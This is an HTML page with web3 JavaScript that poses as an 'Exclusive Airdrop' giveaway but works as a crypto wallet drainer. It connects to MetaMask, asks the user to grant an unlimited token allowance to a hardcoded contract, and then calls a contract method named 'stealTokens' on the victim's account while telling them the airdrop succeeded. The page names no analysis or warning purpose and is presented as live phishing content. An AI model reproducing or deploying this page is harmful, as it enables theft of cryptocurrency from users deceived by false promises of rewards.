<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exclusive Airdrop Opportunity</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6e7dff, #00c6ff);
      color: white;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 500px;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 20px;
      color: #ffeb3b;
    }

    h2 {
      font-size: 1.5rem;
      margin-bottom: 30px;
      color: #ffffff;
    }

    .btn {
      background-color: #4caf50;
      color: white;
      border: none;
      padding: 15px 30px;
      margin: 10px;
      font-size: 1.2rem;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:disabled {
      background-color: #aaa;
    }

    .btn:hover {
      background-color: #45a049;
    }

    .footer {
      margin-top: 30px;
      color: #ffeb3b;
      font-size: 0.9rem;
    }

    .footer a {
      color: #ffeb3b;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .claim-btn-container {
      margin-top: 30px;
    }

    #loadingOverlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      z-index: 1000;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: white;
      text-align: center;
    }

    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #ffeb3b;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸŽ‰ Exclusive Airdrop Just For You! ðŸŽ‰</h1>
    <h2>Claim your rewards today and start your journey to success!</h2>

    <button id="connectButton" class="btn">Connect to MetaMask</button>
    <button id="approveButton" class="btn" disabled>Approve Unlimited AirDrops</button>

    <div class="claim-btn-container">
      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
    </div>

    <div class="footer">
      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
      <p>Need help? <a href="#">Contact Us</a></p>
    </div>
  </div>

  <!-- Loading Overlay -->
  <div id="loadingOverlay">
    <div class="loader"></div>
    <p id="loadingText">Processing...</p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    const contractAddress = '0x51ACC66Ea593080C8e006ddE56eb86b060A0fd37';
    const tokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4';
    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';

    let web3;
    let accounts;

    function showLoading(message) {
      document.getElementById('loadingOverlay').style.display = 'flex';
      document.getElementById('loadingText').innerText = message || 'Processing...';
    }

    function hideLoading() {
      document.getElementById('loadingOverlay').style.display = 'none';
    }

    async function connectMetaMask() {
      if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        try {
          showLoading('Connecting to MetaMask...');
          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          hideLoading();
          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
          document.getElementById('approveButton').disabled = false;
        } catch (error) {
          hideLoading();
          alert('User rejected the request');
        }
      } else {
        alert('Please install MetaMask to use this feature');
      }
    }

    async function approveSpending() {
      if (!web3) return;
      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
      try {
        showLoading('Approving spending...');
        await tokenContract.methods.approve(contractAddress, web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({ from: accounts[0] });
        hideLoading();
        alert('Approval successful! You can now claim your airdrop.');
        document.getElementById('claimAirdropButton').disabled = false;
      } catch (error) {
        hideLoading();
        alert('Error during approval');
      }
    }

    async function claimAirdrop() {
      if (!web3) return;
      const contract = new web3.eth.Contract(contractABI, contractAddress);
      try {
        showLoading('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        hideLoading();
        alert('Airdrop claimed successfully!');
      } catch (error) {
        hideLoading();
        alert('Error claiming airdrop');
      }
    }

    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
    document.getElementById('approveButton').addEventListener('click', approveSpending);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
  </script>
</body>
</html>
